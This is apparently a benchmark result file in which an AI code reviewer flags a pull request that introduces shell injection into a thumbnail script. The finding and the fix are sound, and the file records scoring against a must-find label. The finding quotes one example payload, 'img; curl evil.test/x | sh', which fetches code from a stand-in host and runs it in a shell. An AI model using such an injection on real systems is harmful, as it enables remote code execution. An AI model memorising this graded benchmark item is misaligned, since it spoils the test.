@@ -1,0 +1,79 @@
+{
+  "case": "C005",
+  "pr": "C005",
+  "repo": "fixture",
+  "provider": "grok",
+  "api_base": "",
+  "model": "grok-4.5",
+  "prompt": "composed",
+  "extension": false,
+  "runtime_head": "4e469f0c6687",
+  "turns": 3,
+  "tool_calls": null,
+  "seconds": 41.2,
+  "setup_seconds": 0.0,
+  "total_seconds": 41.2,
+  "usage": {
+    "in": 30905,
+    "cache_read": 57216,
+    "cache_write": 0,
+    "out": 1643,
+    "source": "cli"
+  },
+  "cost_usd": 0.0888328,
+  "changed_files": [
+    "thumbs.py"
+  ],
+  "findings": [
+    {
+      "path": "thumbs.py",
+      "line": 7,
+      "severity": "critical",
+      "body": "`subprocess.run` is now called with `shell=True` and an f-string that interpolates `upload_dir`, `name`, and `oid` with no quoting. A crafted `name` (or `upload_dir` / `oid`) such as `img; curl evil.test/x | sh` executes arbitrary commands on the thumbnail host.\n\nImageMagick policy delegates do not require a shell \u2014 restore the argv-list form (and keep the absolute binary path). If a shell were unavoidable, pass `shlex.quote()` around every interpolated value.\n\n```suggestion\n        [\"/usr/bin/convert\", f\"{upload_dir}/{name}\", f\"/srv/thumbs/{oid}.png\"],\n        check=True,\n```"
+    }
+  ],
+  "summary": "## Verdict\n\nCritical security regression: this change introduces shell injection in thumbnail conversion.\n\n## Narrative\n\n`make_thumb` previously invoked ImageMagick via an argv list (`subprocess.run([...], shell=False` by default), which is the safe pattern for external binaries. The PR replaces that with a single shell string and `shell=True`, interpolating `upload_dir`, `name`, and `oid` with no quoting or sanitization.\n\nAny value containing shell metacharacters (`;`, `|`, `$(...)`, backticks, spaces, quotes) becomes attacker-controlled command execution on the host that runs thumbnails. The removed comment claimed `name` was validated upstream; even if that were still true, `upload_dir` and `oid` are also interpolated, and upstream validation is not a substitute for argv-form execution.\n\nThe stated rationale (ImageMagick 7 policy delegate requiring shell form) does not hold: `policy.xml` delegates apply to the `convert` binary regardless of whether it is started via execve or a shell. If a shell were truly required, each argument would still need `shlex.quote()` \u2014 and the argv form remains the correct fix.\n\n## Release decision\n\n**Recommendation:** request-changes\n",
+  "verification": [
+    {
+      "path": "thumbs.py",
+      "line": 7,
+      "severity_claimed": "critical",
+      "status": "verified",
+      "reason": "The head version of thumbs.py runs `subprocess.run` with `shell=True` and an unquoted f-string interpolating `upload_dir`, `name`, and `oid`, whereas base used a safe argv list. Any metacharacters in those values become shell commands; no in-repo validation remains."
+    }
+  ],
+  "refuted": [],
+  "verifier": {
+    "runs": 1,
+    "seconds": 9.365,
+    "verified": 1,
+    "refuted": 0,
+    "downgraded": 0,
+    "unverified": 0,
+    "skipped": 0,
+    "model": "grok-4.5",
+    "alias": "economy",
+    "endpoint_kind": "xai",
+    "reason": "",
+    "usage": {
+      "in": 3992,
+      "out": 386
+    },
+    "cost_usd": 0.01094
+  },
+  "score": {
+    "must_find_total": 1,
+    "must_find_hits": 1,
+    "hits": [
+      "C005-d1"
+    ],
+    "misses": [],
+    "false_positives": [],
+    "unlabelled_findings": 0,
+    "severity_matches": 1,
+    "summary_present": true,
+    "suggestion_blocks": 1,
+    "coverage_paths": 1,
+    "changed_files": 1
+  }
+}
